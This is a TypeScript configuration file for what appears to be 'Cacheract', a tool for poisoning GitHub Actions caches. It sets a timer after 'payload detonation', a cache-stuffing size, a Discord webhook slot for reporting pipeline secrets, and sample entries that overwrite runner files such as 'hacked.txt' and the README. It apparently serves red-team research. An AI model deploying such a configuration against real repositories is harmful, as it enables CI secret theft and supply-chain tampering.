interface Replacement {
    FILE_PATH: string;
    FILE_CONTENT?: string;
    FILE_URL?: string;
    // Add more properties as needed
}

export type ManualCacheEntry  = {
    key: string;
    version: string;
}

// Time in second to sleep after each payload detonation.
export const SLEEP_TIMER: number = 15;

export const SOFTEN_RUNNER: boolean = false;

// Number of GBs to stuff the cache with upon the 
// initial execution.
export const FILL_CACHE: number = 0;

// Add a discord webhook to report accessible pipeline secrets and other information.
export const DISCORD_WEBHOOK: string = "";
// Define the REPLACEMENTS constant with specific types, can be a base64 encoded file
// OR a URL containing the raw file content. URLs must be accessible via GET without
// any authentication.
// SAMPLE REPLACEMENTS, please remove or edit prior to using cacheract
export const REPLACEMENTS: Replacement[] = [
    {
        FILE_PATH: "/home/runner/work/Cacheract/Cacheract/hacked.txt",
        FILE_CONTENT: "AAAAAA=="
    },
    {
        FILE_PATH: "/home/runner/work/Cacheract/Cacheract/README.md",
        FILE_URL: "https://raw.githubusercontent.com/AdnaneKhan/Gato-X/refs/heads/main/README.md"
    }
]

// Define the EXPLICIT_ENTRIES constant with specific cache entries, along with a placeholder size.
// 
export const EXPLICIT_ENTRIES: ManualCacheEntry[] = [
    {
        key: "my-custom-cacheract-key",
        version: "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b",
    }
]
